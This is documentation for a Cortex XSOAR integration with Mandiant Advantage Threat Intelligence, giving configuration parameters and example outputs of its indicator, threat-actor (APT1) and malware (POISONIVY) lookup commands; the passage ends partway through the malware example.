Enrich Indicators of Compromise, and fetch information about Actors, Malware Families, and Campaigns from Mandiant Advantage.
This integration was integrated and tested with version xx of Mandiant Advantage Threat Intelligence

## Configure Mandiant Advantage Threat Intelligence on Cortex XSOAR

1. Navigate to **Settings** > **Integrations** > **Servers & Services**.
2. Search for Mandiant Advantage Threat Intelligence.
3. Click **Add instance** to create and configure a new integration instance.

    | **Parameter** | **Description** | **Required** |
    | --- | --- | --- |
    | API Base URL | Leave as 'api.intelligence.mandiant.com' if unsure | False |
    | API Key | Your API Key from Mandiant Advantage Threat Intelligence | True |
    | Secret Key | Your Secret Key from Mandiant Advantage Threat Intelligence | True |
    | Fetch indicators |  | False |
    | Indicator Reputation | Indicators from this integration instance will be marked with this reputation. | False |
    | Source Reliability | Reliability of the source providing the intelligence data. | True |
    | Traffic Light Protocol Color | The Traffic Light Protocol \(TLP\) designation to apply to indicators fetched from the feed. | False |
    | Feed Expiration Policy |  | False |
    | Feed Expiration Interval |  | False |
    | Feed Fetch Interval |  | False |
    | Feed Minimum Confidence Score | The minimum MScore value to import as part of the feed | True |
    | Feed Exclude Open Source Intelligence | Whether to exclude Open Source Intelligence as part of the feed | True |
    | Mandiant indicator type | The type of indicators to fetch. Indicator type might include the following: Domains, IPs, Files and URLs. | False |
    | First fetch time | The maximum value allowed is 90 days. | False |
    | Maximum number of indicators per fetch | Maximum value of 1000.  Any values higher will be capped to 1000 | False |
    | Tags | Supports CSV values. | False |
    | Timeout | API calls timeout. | False |
    | Bypass exclusion list | When selected, the exclusion list is ignored for indicators from this feed. This means that if an indicator from this feed is on the exclusion list, the indicator might still be added to the system. | False |
    | Retrieve indicator metadata | Retrieve additional information for each indicator. Note that this requires additional API calls. | False |
    | Create relationships | Note that this requires additional API calls. | False |
    | Trust any certificate (not secure) |  | False |
    | Use system proxy settings |  | False |

4. Click **Test** to validate the URLs, token, and connection.

## Commands

You can execute these commands from the Cortex XSOAR CLI, as part of an automation, or in a playbook.
After you successfully execute a command, a DBot message appears in the War Room with the command details.

### mati-get-indicator

***
Get information about a single Indicator of Compromise from Mandiant

#### Base Command

`mati-get-indicator`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| indicator_value | Value of the indicator to look up.  Can be URL, domain name, IP address, or file hash. | Required | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| MANDIANTTI.IP.score | Number | The Severity Score of the IP indicator | 
| MANDIANTTI.IP.fields.ip | String | The IP address of the IP indicator | 
| MANDIANTTI.FILE.score | Number | The Severity Score of the File indicator | 
| MANDIANTTI.FILE.fields.md5 | String | The MD5 Hash associated with the File indicator | 
| MANDIANTTI.FILE.fields.sha256 | String | The SHA256 Hash associated with the File indicator | 
| MANDIANTTI.FILE.fields.sha1 | String | The SHA1 Hash associated with the File indicator | 
| MANDIANTTI.DOMAIN.score | Number | The Severity Score of the Domain indicator | 
| MANDIANTTI.DOMAIN.fields.dns | String | The DNS record value for the Domain indicator | 
| MANDIANTTI.DOMAIN.fields.domain | String | The domain name for the Domain indicator | 
| MANDIANTTI.URL.score | Number | The Severity Score of the URL indicator | 
| MANDIANTTI.URL.fields.url | String | The URL value for the Domain indicator | 

#### Command example
```!mati-get-indicator indicator_value=124.248.207.50```
#### Context Example
```json
{
    "MANDIANTTI": {
        "IP": {
            "fields": {
                "DBotScore": {
                    "Indicator": "124.248.207.50",
                    "Reliability": "A - Completely reliable",
                    "Score": 2,
                    "Type": "ip",
                    "Vendor": "Mandiant"
                },
                "firstseenbysource": "2016-06-09T16:28:01.000Z",
                "ip": "124.248.207.50",
                "lastseenbysource": "2018-04-19T17:23:59.000Z",
                "stixid": "ipv4--3a4d8f76-6fde-5b25-9672-a45a0ac16bc8",
                "trafficlightprotocol": "AMBER"
            },
            "rawJSON": {
                "attributed_associations": [
                    {
                        "id": "threat-actor--3790b99d-7067-536c-821d-19953727bf7b",
                        "name": "Turla Team",
                        "type": "threat-actor"
                    }
                ],
                "campaigns": [],
                "first_seen": "2016-06-09T16:28:01.000Z",
                "id": "ipv4--3a4d8f76-6fde-5b25-9672-a45a0ac16bc8",
                "is_exclusive": false,
                "is_publishable": true,
                "last_seen": "2018-04-19T17:23:59.000Z",
                "last_updated": "2022-05-14T10:15:13.771Z",
                "mscore": 52,
                "publications": [],
                "sources": [
                    {
                        "category": [],
                        "first_seen": "2018-01-08T21:29:53.000+0000",
                        "last_seen": "2018-04-19T17:23:59.000+0000",
                        "osint": false,
                        "source_name": "Mandiant"
                    },
                    {
                        "category": [],
                        "first_seen": "2016-06-09T16:28:01.000+0000",
                        "last_seen": "2016-06-09T16:28:01.000+0000",
                        "osint": false,
                        "source_name": "Mandiant"
                    }
                ],
                "type": "ipv4",
                "value": "124.248.207.50"
            },
            "relationships": [],
            "score": 2,
            "type": "IP",
            "value": {
                "124.248.207.50": "[124.248.207.50](#/indicator/34576)"
            }
        }
    }
}
```

#### Human Readable Output

>### Results
>|fields|rawJSON|relationships|score|type|value|
>|---|---|---|---|---|---|
>| firstseenbysource: 2016-06-09T16:28:01.000Z<br/>lastseenbysource: 2018-04-19T17:23:59.000Z<br/>stixid: ipv4--3a4d8f76-6fde-5b25-9672-a45a0ac16bc8<br/>trafficlightprotocol: AMBER<br/>DBotScore: {"Indicator": "124.248.207.50", "Type": "ip", "Vendor": "Mandiant", "Score": 2, "Reliability": "A - Completely reliable"}<br/>ip: 124.248.207.50 | id: ipv4--3a4d8f76-6fde-5b25-9672-a45a0ac16bc8<br/>mscore: 52<br/>type: ipv4<br/>value: 124.248.207.50<br/>is_exclusive: false<br/>is_publishable: true<br/>sources: {'first_seen': '2018-01-08T21:29:53.000+0000', 'last_seen': '2018-04-19T17:23:59.000+0000', 'osint': False, 'category': [], 'source_name': 'Mandiant'},<br/>{'first_seen': '2016-06-09T16:28:01.000+0000', 'last_seen': '2016-06-09T16:28:01.000+0000', 'osint': False, 'category': [], 'source_name': 'Mandiant'}<br/>attributed_associations: {'id': 'threat-actor--3790b99d-7067-536c-821d-19953727bf7b', 'name': 'Turla Team', 'type': 'threat-actor'}<br/>last_updated: 2022-05-14T10:15:13.771Z<br/>first_seen: 2016-06-09T16:28:01.000Z<br/>last_seen: 2018-04-19T17:23:59.000Z<br/>campaigns: <br/>publications:  |  | 2 | IP | 124.248.207.50: [124.248.207.50](#/indicator/34576) |


### mati-get-actor

***
Get information about a Threat Actor from Mandiant

#### Base Command

`mati-get-actor`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| actor_name | Name of the actor to look up. | Required | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| MANDIANTTI.ThreatActor.value | String | The name of the ThreatActor | 
| MANDIANTTI.ThreatActor.fields.primarymotivation | String | The primary motivation of the ThreatActor | 
| MANDIANTTI.ThreatActor.fields.tags | String | The tags and target industries of the ThreatActor | 
| MANDIANTTI.ThreatActor.fields.aliases | String | The known aliases of the ThreatActor | 
| MANDIANTTI.ThreatActor.fields.targets | String | The known targets of the ThreatActor | 
| MANDIANTTI.ThreatActor.fields.description | String | The description of the ThreatActor | 
| MANDIANTTI.ThreatActor.fields.publications.title | String | The title of a report associated with the ThreatActor | 
| MANDIANTTI.ThreatActor.fields.publications.link | String | The link to the report in Mandiant Advantage | 

#### Command example
```!mati-get-actor actor_name=APT1```
#### Context Example
```json
{
    "MANDIANTTI": {
        "ThreatActor": {
            "fields": {
                "DBot Score": {
                    "Indicator": null,
                    "Reliability": "A - Completely reliable",
                    "Score": 0,
                    "Type": "Actor",
                    "Vendor": "Mandiant"
                },
                "aliases": [
                    "Apt1 (Recorded Future)",
                    "Bronzesunset (Dell SecureWorks)",
                    "Comment Crew (Internet)",
                    "Comment Crew (ThreatConnect)",
                    "Comment Panda (CrowdStrike)",
                    "Commentcrew (Symantec)",
                    "Dev0046 (Microsoft)",
                    "Famoussparrow (ESET)",
                    "Fluorine (Microsoft)",
                    "Foxypanda (CrowdStrike)",
                    "Ghostemperor (Kaspersky)",
                    "Kumming Group (Dell SecureWorks)",
                    "Shanghaigroup (Dell SecureWorks)",
                    "Tg8223 (Dell SecureWorks)"
                ],
                "description": "APT1 refers to a distinct grouping of global cyber espionage activity with a nexus to China. Based on available data, we assess that this is a nation-state-sponsored group located in China. Specifically, we believe that APT1 is the 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's 3rd Department, or Unit 61398. The activity is distinguished by the use of common infrastructure and tools and a clear intent to collect intelligence on a number of issues that may be of interest to the People's Republic of China (PRC).",
                "firstseenbysource": [
                    "2003-06-20T12:00:00.000Z",
                    "2019-05-22T00:00:00.000Z"
                ],
                "lastseenbysource": [
                    "2015-10-20T00:00:00.000Z",
                    "2022-12-22T00:00:00.000Z"
                ],
                "name": "APT1",
                "primarymotivation": "Espionage",
                "publications": [
                    {
                        "link": "https://advantage.mandiant.com/reports/23-00002244",
                        "source": "Mandiant",
                        "timestamp": 1675443298,
                        "title": "MITRE ATT&CK for ICS Tactics: Impact"
                    },
                    {
                        "link": "https://advantage.mandiant.com/reports/22-00023922",
                        "source": "Mandiant",
                        "timestamp": 1666102868,
                        "title": "Weekly Malware Update for Oct. 10\u201317, 2022"
                    }
                ],
                "stixid": "threat-actor--0ac5c1db-8ad6-54b8-b4b9-c32fc738c54a",
                "tags": [
                    "Aerospace & Defense",
                    "Chemicals & Materials",
                    "Civil Society & Non-Profits",
                    "Construction & Engineering",
                    "Education",
                    "Energy & Utilities",
                    "Financial Services",
                    "Governments",
                    "Healthcare",
                    "Hospitality",
                    "Legal & Professional Services",
                    "Manufacturing",
                    "Media & Entertainment",
                    "Oil & Gas",
                    "Retail",
                    "Technology",
                    "Telecommunications",
                    "Transportation"
                ],
                "targets": [
                    "Belgium",
                    "Canada",
                    "Denmark",
                    "France",
                    "Hong Kong",
                    "India",
                    "Israel",
                    "Japan",
                    "Luxembourg",
                    "Norway",
                    "Singapore",
                    "South Africa",
                    "Switzerland",
                    "Taiwan",
                    "United Arab Emirates",
                    "United Kingdom",
                    "United States of America"
                ],
                "trafficlightprotocol": "AMBER",
                "updateddate": "2023-02-23T14:17:35.000Z"
            },
            "rawJSON": {
                "aliases": [
                    {
                        "attribution_scope": "confirmed",
                        "name": "Apt1 (Recorded Future)"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "name": "Bronzesunset (Dell SecureWorks)"
                    }
                ],
                "associated_uncs": [
                    {
                        "attribution_scope": "possible",
                        "id": "threat-actor--aa6c510a-ddb7-5ea7-9921-bee8408ed3be",
                        "name": "UNC2286"
                    }
                ],
                "audience": [
                    {
                        "license": "INTEL_RBI_FUS",
                        "name": "intel_fusion"
                    },
                    {
                        "license": "INTEL_CYB_ESP",
                        "name": "intel_ce"
                    }
                ],
                "counts": {
                    "aliases": 14,
                    "associated_uncs": 1,
                    "attack_patterns": 133,
                    "cve": 2,
                    "industries": 18,
                    "malware": 104,
                    "reports": 9
                },
                "cve": [
                    {
                        "attribution_scope": "possible",
                        "cve_id": "CVE-2020-0688",
                        "id": "vulnerability--5335a68a-b519-51c3-b05f-bc1749604b7c"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "cve_id": "CVE-2009-3129",
                        "id": "vulnerability--8cb90843-f69a-5aa6-95dc-3bdebcc8fa78"
                    }
                ],
                "description": "APT1 refers to a distinct grouping of global cyber espionage activity with a nexus to China. Based on available data, we assess that this is a nation-state-sponsored group located in China. Specifically, we believe that APT1 is the 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's 3rd Department, or Unit 61398. The activity is distinguished by the use of common infrastructure and tools and a clear intent to collect intelligence on a number of issues that may be of interest to the People's Republic of China (PRC).",
                "id": "threat-actor--0ac5c1db-8ad6-54b8-b4b9-c32fc738c54a",
                "industries": [
                    {
                        "attribution_scope": "confirmed",
                        "first_seen": "2009-07-29T04:35:35.000Z",
                        "id": "identity--cc593632-0c42-500c-8d0b-d38e97b90f1d",
                        "last_seen": "2014-10-24T03:07:40.000Z",
                        "name": "Aerospace & Defense"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "first_seen": "2008-08-10T16:25:00.000Z",
                        "id": "identity--a93f63bc-bbfc-52ab-88c0-794c74f5bec0",
                        "last_seen": "2014-09-05T00:00:00.000Z",
                        "name": "Chemicals & Materials"
                    }
                ],
                "intel_free": true,
                "is_publishable": true,
                "last_activity_time": "2015-10-20T00:00:00.000Z",
                "last_updated": "2023-02-23T14:17:35.000Z",
                "locations": {
                    "source": [
                        {
                            "country": {
                                "attribution_scope": "confirmed",
                                "id": "location--740e7e5f-f2a0-55e0-98a3-88872c55b581",
                                "iso2": "CN",
                                "name": "China"
                            },
                            "region": {
                                "attribution_scope": "confirmed",
                                "id": "location--8fc231f3-4e62-57e7-b734-eaee0a734612",
                                "name": "Asia"
                            },
                            "sub_region": {
                                "attribution_scope": "confirmed",
                                "id": "location--7b33370b-da4b-5c48-9741-b69f69febb77",
                                "name": "East Asia"
                            }
                        }
                    ],
                    "target": [
                        {
                            "attribution_scope": "confirmed",
                            "id": "location--a509dfc8-789b-595b-a201-29c7af1dc0bb",
                            "iso2": "BE",
                            "name": "Belgium",
                            "region": "Europe",
                            "sub-region": "West Europe"
                        },
                        {
                            "attribution_scope": "confirmed",
                            "id": "location--fde14246-c07b-5f3f-9ac8-8d4d50910f15",
                            "iso2": "CA",
                            "name": "Canada",
                            "region": "Americas",
                            "sub-region": "North America"
                        }
                    ],
                    "target_region": [
                        {
                            "attribution_scope": "confirmed",
                            "id": "location--9488166d-6469-5e54-ba5f-9abf2a385824",
                            "key": "africa",
                            "name": "Africa"
                        },
                        {
                            "attribution_scope": "confirmed",
                            "id": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3",
                            "key": "americas",
                            "name": "Americas"
                        }
                    ],
                    "target_sub_region": [
                        {
                            "attribution_scope": "confirmed",
                            "id": "location--7b33370b-da4b-5c48-9741-b69f69febb77",
                            "key": "eastasia",
                            "name": "East Asia",
                            "region": "Asia"
                        },
                        {
                            "attribution_scope": "confirmed",
                            "id": "location--0daadcfb-ad23-5f16-b53b-6c5b09bf20de",
                            "key": "northamerica",
                            "name": "North America",
                            "region": "Americas"
                        }
                    ]
                },
                "malware": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--09673ebc-9fbf-5ab0-9130-7874c84cd3e4",
                        "name": "AGEDMOAT"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--7c00490d-dc79-5623-bf50-fb4b169d1b4f",
                        "name": "AGEDSHOE"
                    }
                ],
                "motivations": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "motivation--1b8ca82a-7cff-5622-bedd-965c11d38a9e",
                        "name": "Espionage"
                    }
                ],
                "name": "APT1",
                "observed": [
                    {
                        "attribution_scope": "confirmed",
                        "earliest": "2003-06-20T12:00:00.000Z",
                        "recent": "2015-10-20T00:00:00.000Z"
                    },
                    {
                        "attribution_scope": "possible",
                        "earliest": "2019-05-22T00:00:00.000Z",
                        "recent": "2022-12-22T00:00:00.000Z"
                    }
                ],
                "tools": [
                    {
                        "attribution_scope": "possible",
                        "id": "malware--e224f74a-ca0e-540b-884f-03753787316f",
                        "name": "NLTEST"
                    },
                    {
                        "attribution_scope": "possible",
                        "id": "malware--76ccff98-5f46-5b7e-8eae-f7b439d0e64a",
                        "name": "TCPTRAN"
                    }
                ],
                "type": "threat-actor"
            },
            "relationships": [
                {
                    "entityA": "APT1",
                    "entityAFamily": "Indicator",
                    "entityAType": "Threat Actor",
                    "entityB": "AGEDMOAT",
                    "entityBFamily": "Indicator",
                    "entityBType": "Malware",
                    "fields": {},
                    "name": "related-to",
                    "reverseName": "related-to",
                    "type": "IndicatorToIndicator"
                },
                {
                    "entityA": "APT1",
                    "entityAFamily": "Indicator",
                    "entityAType": "Threat Actor",
                    "entityB": "AGEDSHOE",
                    "entityBFamily": "Indicator",
                    "entityBType": "Malware",
                    "fields": {},
                    "name": "related-to",
                    "reverseName": "related-to",
                    "type": "IndicatorToIndicator"
                }
            ],
            "score": 0,
            "type": "Threat Actor",
            "value": "APT1"
        }
    }
}
```

#### Human Readable Output

>### Results
>|fields|rawJSON|relationships|score|type|value|
>|---|---|---|---|---|---|
>| primarymotivation: Espionage<br/>tags: Aerospace & Defense,<br/>Chemicals & Materials,<br/>Civil Society & Non-Profits,<br/>Construction & Engineering,<br/>Education,<br/>Energy & Utilities,<br/>Financial Services,<br/>Governments,<br/>Healthcare,<br/>Hospitality,<br/>Legal & Professional Services,<br/>Manufacturing,<br/>Media & Entertainment,<br/>Oil & Gas,<br/>Retail,<br/>Technology,<br/>Telecommunications,<br/>Transportation<br/>aliases: Apt1 (Recorded Future),<br/>Bronzesunset (Dell SecureWorks),<br/>Comment Crew (Internet),<br/>Comment Crew (ThreatConnect),<br/>Comment Panda (CrowdStrike),<br/>Commentcrew (Symantec),<br/>Dev0046 (Microsoft),<br/>Famoussparrow (ESET),<br/>Fluorine (Microsoft),<br/>Foxypanda (CrowdStrike),<br/>Ghostemperor (Kaspersky),<br/>Kumming Group (Dell SecureWorks),<br/>Shanghaigroup (Dell SecureWorks),<br/>Tg8223 (Dell SecureWorks)<br/>firstseenbysource: 2003-06-20T12:00:00.000Z,<br/>2019-05-22T00:00:00.000Z<br/>lastseenbysource: 2015-10-20T00:00:00.000Z,<br/>2022-12-22T00:00:00.000Z<br/>targets: Belgium,<br/>Canada,<br/>Denmark,<br/>France,<br/>Hong Kong,<br/>India,<br/>Israel,<br/>Japan,<br/>Luxembourg,<br/>Norway,<br/>Singapore,<br/>South Africa,<br/>Switzerland,<br/>Taiwan,<br/>United Arab Emirates,<br/>United Kingdom,<br/>United States of America<br/>stixid: threat-actor--0ac5c1db-8ad6-54b8-b4b9-c32fc738c54a<br/>name: APT1<br/>description: APT1 refers to a distinct grouping of global cyber espionage activity with a nexus to China. Based on available data, we assess that this is a nation-state-sponsored group located in China. Specifically, we believe that APT1 is the 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's 3rd Department, or Unit 61398. The activity is distinguished by the use of common infrastructure and tools and a clear intent to collect intelligence on a number of issues that may be of interest to the People's Republic of China (PRC).<br/>updateddate: 2023-02-23T14:17:35.000Z<br/>trafficlightprotocol: AMBER<br/>DBot Score: {"Indicator": null, "Type": "Actor", "Vendor": "Mandiant", "Score": 0, "Reliability": "A - Completely reliable"}<br/>publications: {'source': 'Mandiant', 'title': 'MITRE ATT&CK for ICS Tactics: Impact', 'link': 'https:<span>//</span>advantage.mandiant.com/reports/23-00002244', 'timestamp': 1675443298.0},<br/>{'source': 'Mandiant', 'title': 'Weekly Malware Update for Oct. 10–17, 2022', 'link': 'https:<span>//</span>advantage.mandiant.com/reports/22-00023922', 'timestamp': 1666102868.0} | industries: {'id': 'identity--cc593632-0c42-500c-8d0b-d38e97b90f1d', 'name': 'Aerospace & Defense', 'attribution_scope': 'confirmed', 'first_seen': '2009-07-29T04:35:35.000Z', 'last_seen': '2014-10-24T03:07:40.000Z'},<br/>{'id': 'identity--a93f63bc-bbfc-52ab-88c0-794c74f5bec0', 'name': 'Chemicals & Materials', 'attribution_scope': 'confirmed', 'first_seen': '2008-08-10T16:25:00.000Z', 'last_seen': '2014-09-05T00:00:00.000Z'}<br/>locations: {"source": [{"region": {"id": "location--8fc231f3-4e62-57e7-b734-eaee0a734612", "name": "Asia", "attribution_scope": "confirmed"}, "country": {"id": "location--740e7e5f-f2a0-55e0-98a3-88872c55b581", "name": "China", "iso2": "CN", "attribution_scope": "confirmed"}, "sub_region": {"attribution_scope": "confirmed", "id": "location--7b33370b-da4b-5c48-9741-b69f69febb77", "name": "East Asia"}}], "target": [{"id": "location--a509dfc8-789b-595b-a201-29c7af1dc0bb", "name": "Belgium", "iso2": "BE", "region": "Europe", "sub-region": "West Europe", "attribution_scope": "confirmed"}, {"id": "location--fde14246-c07b-5f3f-9ac8-8d4d50910f15", "name": "Canada", "iso2": "CA", "region": "Americas", "sub-region": "North America", "attribution_scope": "confirmed"}]}<br/>id: threat-actor--0ac5c1db-8ad6-54b8-b4b9-c32fc738c54a<br/>name: APT1<br/>description: APT1 refers to a distinct grouping of global cyber espionage activity with a nexus to China. Based on available data, we assess that this is a nation-state-sponsored group located in China. Specifically, we believe that APT1 is the 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's 3rd Department, or Unit 61398. The activity is distinguished by the use of common infrastructure and tools and a clear intent to collect intelligence on a number of issues that may be of interest to the People's Republic of China (PRC).<br/>type: threat-actor<br/>last_activity_time: 2015-10-20T00:00:00.000Z<br/>audience: {'name': 'intel_fusion', 'license': 'INTEL_RBI_FUS'},<br/>{'name': 'intel_ce', 'license': 'INTEL_CYB_ESP'}<br/>is_publishable: true<br/>intel_free: true<br/>counts: {"reports": 9, "malware": 104, "cve": 2, "associated_uncs": 1, "aliases": 14, "industries": 18, "attack_patterns": 133}<br/>last_updated: 2023-02-23T14:17:35.000Z<br/>aliases: {'name': 'Apt1 (Recorded Future)', 'attribution_scope': 'confirmed'},<br/>{'name': 'Bronzesunset (Dell SecureWorks)', 'attribution_scope': 'confirmed'}<br/>malware: {'id': 'malware--09673ebc-9fbf-5ab0-9130-7874c84cd3e4', 'name': 'AGEDMOAT', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--7c00490d-dc79-5623-bf50-fb4b169d1b4f', 'name': 'AGEDSHOE', 'attribution_scope': 'confirmed'}<br/>motivations: {'id': 'motivation--1b8ca82a-7cff-5622-bedd-965c11d38a9e', 'name': 'Espionage', 'attribution_scope': 'confirmed'}<br/>associated_uncs: {'attribution_scope': 'possible', 'id': 'threat-actor--aa6c510a-ddb7-5ea7-9921-bee8408ed3be', 'name': 'UNC2286'}<br/>cve: {'attribution_scope': 'possible', 'cve_id': 'CVE-2020-0688', 'id': 'vulnerability--5335a68a-b519-51c3-b05f-bc1749604b7c'},<br/>{'attribution_scope': 'confirmed', 'cve_id': 'CVE-2009-3129', 'id': 'vulnerability--8cb90843-f69a-5aa6-95dc-3bdebcc8fa78'}<br/>observed: {'earliest': '2003-06-20T12:00:00.000Z', 'recent': '2015-10-20T00:00:00.000Z', 'attribution_scope': 'confirmed'},<br/>{'earliest': '2019-05-22T00:00:00.000Z', 'recent': '2022-12-22T00:00:00.000Z', 'attribution_scope': 'possible'}<br/>tools: {'id': 'malware--e224f74a-ca0e-540b-884f-03753787316f', 'name': 'NLTEST', 'attribution_scope': 'possible'},<br/>{'id': 'malware--76ccff98-5f46-5b7e-8eae-f7b439d0e64a', 'name': 'TCPTRAN', 'attribution_scope': 'possible'},<br/>{'id': 'malware--126826c5-cfdc-5970-a734-a4ce7d6d92f4', 'name': 'RAR', 'attribution_scope': 'possible'},<br/>{'id': 'malware--934dcadf-f9a8-52c1-9c90-353a1c3144d5', 'name': 'PSEXEC', 'attribution_scope': 'possible'},<br/>{'id': 'malware--0f315a7c-9bf4-58dc-8ea9-033355617485', 'name': 'PSINFO', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--d84951d6-8f8a-5f7f-92cb-4fee4ef18664', 'name': 'LDIFDE', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--4fb0b16d-53d6-56e5-975f-10458225f317', 'name': 'COBALTSTRIKE', 'attribution_scope': 'possible'},<br/>{'id': 'malware--22055c71-bf62-5456-a5af-b7f298f47627', 'name': 'CMDEXE', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--70e3757d-09ea-5267-9aa3-01be476b3dd9', 'name': 'XCMD', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--82f2aa10-d254-5e1e-a1db-a0c822d4cef6', 'name': 'POWERSHELL', 'attribution_scope': 'possible'},<br/>{'id': 'malware--f872b3e0-c277-5716-baae-885a9c410398', 'name': 'WHOAMI', 'attribution_scope': 'possible'},<br/>{'id': 'malware--0bfd6f0b-4cdc-525c-b3e9-cf56d747f189', 'name': 'FGDUMP', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--a73560d8-e4d4-5a38-8efc-bfe7b8e5aef6', 'name': 'PSFTP', 'attribution_scope': 'possible'},<br/>{'id': 'malware--33e3fd12-4c4a-5824-a4e5-5ac35b308345', 'name': 'PWDUMP', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--0c7945de-0968-55e3-ad4e-1600ddfc6b36', 'name': 'PROCDUMP', 'attribution_scope': 'possible'},<br/>{'id': 'malware--57e5ea29-1c08-5f80-b28e-dd7ca373e4b7', 'name': 'ANGRYIP', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--125d583e-0617-5192-bc27-9f3377bb98c3', 'name': 'WINRAR', 'attribution_scope': 'possible'},<br/>{'id': 'malware--bf2fc1e5-7850-5ecd-87a7-263e6da5708d', 'name': 'MIMIKATZ', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--ed8a8e26-0773-5fcf-b3f3-e17aac203fa3', 'name': 'SFXZIP', 'attribution_scope': 'confirmed'},<br/>{'id': 'malware--0953f997-41ce-5fe2-804a-08fd8d567c29', 'name': 'PUTTY', 'attribution_scope': 'possible'},<br/>{'id': 'malware--2db234c8-596a-58f9-a50f-ce24b58965cd', 'name': 'IMPACKET.SMBEXEC', 'attribution_scope': 'possible'},<br/>{'id': 'malware--b2bb2d97-675e-5023-9cdd-a4274893b4a7', 'name': 'SFXRAR', 'attribution_scope': 'confirmed'} | {'name': 'related-to', 'reverseName': 'related-to', 'type': 'IndicatorToIndicator', 'entityA': 'APT1', 'entityAFamily': 'Indicator', 'entityAType': 'Threat Actor', 'entityB': 'AGEDMOAT', 'entityBFamily': 'Indicator', 'entityBType': 'Malware', 'fields': {}},<br/>{'name': 'related-to', 'reverseName': 'related-to', 'type': 'IndicatorToIndicator', 'entityA': 'APT1', 'entityAFamily': 'Indicator', 'entityAType': 'Threat Actor', 'entityB': 'AGEDSHOE', 'entityBFamily': 'Indicator', 'entityBType': 'Malware', 'fields': {}} | 0 | Threat Actor | APT1 |


### mati-get-malware

***
Get information about a Malware Family from Mandiant

#### Base Command

`mati-get-malware`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| malware_name | Name of the malware family to look up. | Required | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| MANDIANTTI.Malware.value | String | The name of the Malware | 
| MANDIANTTI.Malware.fields.operatingsystemrefs | String | The Operating Systems impacted by the malware | 
| MANDIANTTI.Malware.fields.roles | String | The known roles of the Malware | 
| MANDIANTTI.Malware.fields.description | String | The description of the Malware | 
| MANDIANTTI.Malware.fields.Is Malware Family | String | Whether the Indicator is a Malware Family or a Tool | 
| MANDIANTTI.Malware.fields.publications.title | String | The name of the Malware | 
| MANDIANTTI.Malware.fields.publications.title | String | The title of a report associated with the Malware | 
| MANDIANTTI.Malware.fields.publications.link | String | The link to the report in Mandiant Advantage | 

#### Command example
```!mati-get-malware malware_name=PoisonIvy```
#### Context Example
```json
{
    "MANDIANTTI": {
        "Malware": {
            "fields": {
                "DBot Score": {
                    "Indicator": null,
                    "Reliability": "A - Completely reliable",
                    "Score": 0,
                    "Type": "Malware",
                    "Vendor": "Mandiant"
                },
                "Is Malware Family": true,
                "aliases": [
                    "Pivnoxy (Fortinet)",
                    "PIVY (LAC)",
                    "Pivy (Palo Alto Networks)",
                    "Pivydwnldr",
                    "Poison Ivy",
                    "Poison Ivy (JPCERT)",
                    "Poison Ivy (Proofpoint)",
                    "Poison Ivy (Symantec)",
                    "PoisonIvy",
                    "Poisonivy (Check Point)",
                    "Poisonivy (Recorded Future)",
                    "Royal Road (Anomali)",
                    "Royal Road (Internet)",
                    "Spivy (Palo Alto Networks)"
                ],
                "capabilities": [
                    {
                        "description": "Capable of performing raw access to physical disks.",
                        "name": "Access raw disk"
                    },
                    {
                        "description": "Capable of allocating memory. ",
                        "name": "Allocates memory"
                    }
                ],
                "description": "POISONIVY is a backdoor that exists as shellcode and communicates via a custom binary protocol over TCP. Additional shellcode plugins are downloaded, mapped directly into memory, and executed. Observed plugin functionality includes reverse shell, keylogging, video capture, audio capture, and registry manipulation. POISONIVY is configured, built, and controlled using a publicly available management interface. The interface produces the shellcode that must be included in, or executed by, a separate application.",
                "lastseenbysource": "2023-03-06T02:29:14.000Z",
                "mandiantdetections": [
                    "APT.Backdoor.Win.POISONIVY",
                    "POISON IVY (VARIANT)",
                    "FE_PoisonIVY_Stealer_Toolkit",
                    "FE_APT_Backdoor_Win32_POISONIVY_1",
                    "ET INFO SUSPICIOUS Dotted Quad Host MZ Response (ET OPEN)",
                    "ET POLICY PE EXE or DLL Windows file download HTTP (ET OPEN)",
                    "Backdoor.Win32.Poison.FEC2 (Trellix)",
                    "Trojan.APT.PoisonIvy",
                    "Win.Dropper.Zusy-9801038-0 (ClamAV)",
                    "Backdoor.APT.PoisonIvy",
                    "Win.Malware.Loader-9834612-0 (ClamAV)",
                    "Backdoor.Poison",
                    "Backdoor.Win.PI.FEC2 (Trellix)",
                    "Trojan.Poison",
                    "Trojan.PoisonIvy.DNS",
                    "Win.Trojan.PoisonIvy-9755171-0 (ClamAV)"
                ],
                "name": {
                    "POISONIVY": "[POISONIVY](#/indicator/5559)"
                },
                "operatingsystemrefs": [
                    "Windows"
                ],
                "publications": [
                    {
                        "link": "https://advantage.mandiant.com/reports/22-00022357",
                        "source": "Mandiant",
                        "timestamp": 1668046325,
                        "title": "Country Profile: India (2022)"
                    },
                    {
                        "link": "https://advantage.mandiant.com/reports/21-00010407",
                        "source": "Mandiant",
                        "timestamp": 1648063696,
                        "title": "Supply Chain Compromise Trends, 2019\u20132020"
                    }
                ],
                "roles": [
                    "Backdoor"
                ],
                "stixid": "malware--c14087e2-91dc-5a4c-a820-5eaa86ba4c99",
                "tags": [
                    "Aerospace & Defense",
                    "Agriculture",
                    "Automotive",
